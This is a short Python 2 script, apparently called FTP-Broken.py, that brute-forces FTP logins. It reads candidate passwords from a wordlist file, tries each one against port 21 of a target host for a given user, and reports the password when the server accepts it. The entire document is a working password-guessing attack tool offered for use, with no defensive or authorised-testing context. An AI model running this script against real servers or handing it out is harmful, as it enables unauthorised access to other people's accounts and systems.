#!/usr/bin/python
import socket, sys, re

if len(sys.argv) != 3:
    print "How to use: python FTP-Broken.py 127.0.0.1 user"
    sys.exit()

target = sys.argv[1]
user = sys.argv[2]

f = open('file.txt')
for word in f.readlines():
    print "Brute FTP: %s:%s"%(user, word)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,21))
    s.recv(1024)

    s.send("USER "+user+"\n\r")
    s.recv(1024)
    s.send("PASS "+word+"\n\r")
    response = s.recv(1024)
    s.send("QUIT\n\r")

    if re.search('230', response):
        print "[+] Password Found ---> ",word
        break
